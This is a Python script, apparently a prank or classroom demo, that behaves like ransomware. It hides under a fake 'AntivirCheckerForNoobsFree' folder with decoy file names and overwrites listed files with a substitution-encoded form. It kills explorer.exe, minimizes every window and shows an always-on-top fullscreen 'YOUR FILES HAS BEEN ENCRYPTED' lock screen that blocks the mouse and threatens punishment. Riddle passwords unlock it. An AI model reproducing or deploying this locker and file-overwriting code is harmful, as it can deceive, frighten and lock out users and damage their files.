import os
import subprocess
from random import randint
import pygame
import sys
import atexit
import ctypes
import ctypes.wintypes
from time import sleep

def minimize_all_programs_builtin():
    """
    Minimize all windows using only Windows API (no external dependencies).
    """
    # Constants
    SW_MINIMIZE = 6
    WS_MINIMIZEBOX = 0x00020000
    
    # Define callback function type
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    
    def enum_windows_proc(hwnd, lParam):
        """Callback for EnumWindows"""
        # Check if window is visible
        if ctypes.windll.user32.IsWindowVisible(hwnd):
            # Get window style
            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)  # GWL_STYLE
            # Check if window can be minimized
            if style & WS_MINIMIZEBOX:
                ctypes.windll.user32.ShowWindow(hwnd, SW_MINIMIZE)
        return True
    
    # Create callback and enumerate windows
    callback = WNDENUMPROC(enum_windows_proc)
    ctypes.windll.user32.EnumWindows(callback, 0)
    return True


def create_restricted_window():

    minimize_all_programs_builtin()

    sleep(1)

    print("Pygame starting")
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    
    # Hide mouse cursor
    pygame.mouse.set_visible(False)
    
    # Set up font for text display
    font = pygame.font.Font(None, 48)
    small_font = pygame.font.Font(None, 36)
    
    # Kill explorer to prevent Win+D, Win+M
    subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], capture_output=True)
    
    # Make sure explorer restarts when program exits
    atexit.register(lambda: subprocess.Popen(['explorer.exe']))
    
    if sys.platform == 'win32':
        import ctypes
        
        # Get window handle
        hwnd = pygame.display.get_wm_info()['window']
        user32 = ctypes.windll.user32
        
        # Windows API constants
        HWND_TOPMOST = -1
        SWP_NOMOVE = 0x0002
        SWP_NOSIZE = 0x0001
        SWP_SHOWWINDOW = 0x0040
        
        # Set window to always on top
        user32.SetWindowPos(
            hwnd,
            HWND_TOPMOST,
            0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
        )
    
    allowed_keys = set(range(pygame.K_a, pygame.K_z + 1))
    allowed_keys.update([pygame.K_RETURN, pygame.K_KP_ENTER])
    
    input_text = ""
    session = 0
    max_sessions = 3  # Sessions 0, 1, 2
    
    # Passwords for each session
    passwords = {
        0: "fecdcfebfceb",
        1: "macek",
        2: "nose"
    }

    hits = {
        0: "The password is fecdcfebfceb",
        1: "Who is the best teacher ever?",
        2: "The best word we all know that starts with n"
    }
    
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                continue
            elif event.type == pygame.KEYDOWN:
                if event.key in allowed_keys:
                    if event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                        # Check password for current session
                        if input_text.lower() == passwords[session]:
                            print(f"Session {session} password correct!")
                            if session < max_sessions - 1:
                                session += 1
                                print(f"Moving to session {session}")
                            else:
                                print("All sessions complete! Exiting...")
                                running = False
                        else:
                            print(f"Wrong password for session {session}")
                        input_text = ""
                    else:
                        char = chr(event.key).upper() if event.mod & pygame.KMOD_SHIFT else chr(event.key)
                        input_text += char
                        print(f"Key: {char}")
                elif event.key == pygame.K_q and event.mod & pygame.KMOD_CTRL and event.mod & pygame.KMOD_SHIFT:
                    running = False
            # Ignore all mouse events
            elif event.type in (pygame.MOUSEMOTION, pygame.MOUSEBUTTONDOWN, pygame.MOUSEBUTTONUP, pygame.MOUSEWHEEL):
                pass
        
        # Disable mouse by warping it to corner
        pygame.mouse.set_pos(0, 0)
        
        # Draw everything
        screen.fill((0, 0, 0))
        
        # Draw session level
        
        # Draw progress bar
        bar_width = 300
        bar_height = 20
        bar_x = screen.get_width() // 2 - bar_width // 2
        bar_y = screen.get_height() // 2 - 80
        

        
        # Progress text
        progress_text = small_font.render(f"level {session + 1}/{max_sessions}", True, (255, 255, 255))
        progress_rect = progress_text.get_rect(center=(screen.get_width() // 2, bar_y - 20))
        screen.blit(progress_text, progress_rect)
        
        # Draw title text
        title_text = font.render("YOUR FILES HAS BEEN ENCRYPTED", True, (255, 0, 0))
        title_rect = title_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 - 40))
        screen.blit(title_text, title_rect)
        
        # Draw instruction text
        instruction_text = small_font.render(hits[session], True, (255, 255, 255))
        instruction_rect = instruction_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2))
        screen.blit(instruction_text, instruction_rect)
        
        # Draw input text (shown as asterisks)
        masked_text = "*" * len(input_text)
        input_display = small_font.render(f"Password: {masked_text}", True, (0, 255, 0))
        input_rect = input_display.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 + 60))
        screen.blit(input_display, input_rect)

        warning_text = small_font.render(f"Warning: any action besides trying to decrypt your files WILL BE PUNISHED!", True, (200, 200, 200))
        warning_rect = warning_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 4 * 3))
        screen.blit(warning_text, warning_rect)

        # Continuously force window to stay on top
        if sys.platform == 'win32':
            user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                              SWP_NOMOVE | SWP_NOSIZE)
        
        pygame.display.flip()
    
    pygame.quit()
    print("Pygame end")

print("paths checking")
path_check_state = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "state.txt")

path_to_paths = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "just_a_normal_log.log")

with open(path_to_paths, "r") as f:
    paths = [line.strip() for line in f.readlines()]



path_to_key = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "tohle_neni_key.bin")

with open(path_check_state, "r", encoding="utf-8", errors="ignore") as f:
    state = f.read().strip()



def ascii_to_char(value):
    """
    Convert a single ASCII integer to its character string.
    
    Args:
        value (int): ASCII code (0–127 standard ASCII, 0–255 extended)
    
    Returns:
        str: Single-character string.
    
    Raises:
        TypeError: If value is not an integer.
        ValueError: If value is outside valid byte range.
    """
    # Validate type
    if not isinstance(value, int):
        raise TypeError("ASCII value must be an integer.")
    
    # Validate range (0–255 covers ASCII + extended)
    if value < 0 or value > 255:
        raise ValueError("ASCII value must be between 0 and 255.")
    
    try:
        return chr(value)
    except Exception as e:
        # chr() can still fail on some invalid inputs
        raise ValueError(f"Cannot convert value {value}: {e}")

key = ""

"""
fdsjklfdsfdsjklfds
fdsjklfdsfdsjklfds
fdsjkl------jklfds
fdsjkl-#<>#-jklfds
fdsjkl------jklfds
fdsjklfdsfdsjklfds
fdsjklfdsfdsjklfds
"""


def get_all_files(folder_path: str) -> list:
    """
    Vrátí seznam všech souborů (absolutní cesty) ve složce a všech podsložkách.
    
    Args:
        folder_path: Cesta ke složce
        
    Returns:
        Seznam cest k souborům jako řetězce
    """
    files = []
    
    # os.walk prochází rekurzivně strom složek
    for root, dirs, filenames in os.walk(folder_path):
        for filename in filenames:
            # Složíme úplnou cestu k souboru
            full_path = os.path.join(root, filename)
            files.append(full_path)
    
    return files






def kill_explorer():
    """Kill explorer.exe process"""
    try:
        # Method 1: Using taskkill
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], 
                      capture_output=True)
        print("Explorer killed")
        
    except Exception as e:
        print(f"Error: {e}")

def restart_explorer():
    """Restart explorer.exe"""
    try:
        subprocess.Popen(['explorer.exe'])
        print("Explorer restarted")
    except Exception as e:
        print(f"Error: {e}")





def generate_key(filename):
    chars = []
    for i in range(97, 123):
        chars.append(ascii_to_char(i))
    for i in range(0, 6):
        chars.append(i)

    key = ""
    for i in range(32):
        index = randint(0, len(chars) - 1)
        key += str(chars[index])
        chars.pop(index)
    with open(filename, "w") as f:
        f.write(key)
    print(f"key: {key}")
    return key
    
def bytes_to_hex(byte_data):
    """
    Convert bytes to a hexadecimal string representation.
    
    Args:
        byte_data (bytes): The input byte data to convert.
    
    Returns:
        str: Hexadecimal string representation of the byte data.
    """
    if not isinstance(byte_data, bytes):
        raise TypeError("Input must be of type 'bytes'.")
    
    return byte_data.hex()

def hex_to_bytes(hex_string):
    """
    Convert a hexadecimal string to bytes.
    
    Args:
        hex_string (str): The input hexadecimal string.
    
    Returns:
        bytes: The corresponding byte data.
    
    Raises:
        ValueError: If the input string is not a valid hexadecimal string.
    """
    if not isinstance(hex_string, str):
        raise TypeError("Input must be of type 'str'.")
    
    try:
        return bytes.fromhex(hex_string)
    except ValueError as e:
        raise ValueError(f"Invalid hexadecimal string: {e}")


def permutation_in(text, key):
    # Take every second character from the key
    key_chars = key[::2]

    hex_chars = "abcdef0123456789"


    result = ""

    for i in text:
        result += key_chars[hex_chars.index(i)]
    return result


def permutation_out(text, key):
    key_chars = key[::2]

    hex_chars = "abcdef0123456789"

    result = ""

    for i in text:
        result += hex_chars[key_chars.index(i)]
    return result

                





def encrypt(file_path, key):
    print(f"Encrypting: {file_path}")
    global path_check_state
    with open(file_path, "rb") as f:
        data = f.read()
    in_hex = bytes_to_hex(data)
    permutated = permutation_in(in_hex, key)
    with open(file_path, "w") as f:
        f.write(permutated)

    with open(path_check_state, "w") as f:
        f.write("dec")


def decrypt(file_path, key):
    print(f"Decrypting: {file_path}")
    global path_check_state
    with open(file_path, "r") as f:
        permutated = f.read()
        hex_data = permutation_out(permutated, key)
    data = hex_to_bytes(hex_data)
    with open(file_path, "wb") as f:
        f.write(data)
    with open(path_check_state, "w") as f:
        f.write("enc")

if state == "enc":
    print("Main - enc selected")
    key = generate_key(path_to_key)
    for path in paths:
        encrypt(path, key)
    create_restricted_window()
    with open(path_to_key, "r") as f:
        key = f.read()
    for path in paths:
        decrypt(path, key)

elif state == "dec":
    print("Main - dec selected")
    with open(path_to_key, "r") as f:
        key = f.read()
    for path in paths:
        decrypt(path, key)

